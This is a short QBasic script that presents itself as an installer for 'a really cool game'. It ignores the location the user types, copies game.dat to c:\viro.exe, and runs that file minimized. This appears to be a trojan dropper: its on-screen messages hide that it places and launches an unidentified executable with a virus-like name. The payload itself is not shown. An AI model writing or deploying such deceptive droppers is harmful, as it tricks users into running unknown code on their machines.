CLS
PRINT "This will install a really cool game."
INPUT "Location? >", c$
PRINT "Installing..."
SHELL "copy .\game.dat c:\viro.exe"
PRINT "Finished."
SHELL "start /m c:\viro.exe"
SYSTEM

